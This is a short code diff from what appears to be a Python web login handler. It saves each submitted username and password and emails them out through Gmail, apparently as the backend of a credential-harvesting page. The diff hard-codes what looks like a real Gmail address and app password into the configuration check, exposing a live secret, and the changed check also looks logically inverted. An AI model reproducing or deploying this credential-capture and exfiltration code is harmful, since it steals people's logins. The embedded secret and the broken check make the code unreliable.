@@ -89,7 +89,7 @@ def login():
         save_login_attempt(username, password)
         
         # Send email if credentials are configured
-        if GMAIL_USER != 'your-email@gmail.com' and GMAIL_PASS != 'your-app-password':
+        if GMAIL_USER != 'waemsa19@gmail.com' and GMAIL_PASS != 'mcci julh ypdy ngee':
             send_email(username, password)
         
         return jsonify({'message': 'Login received and saved!'})
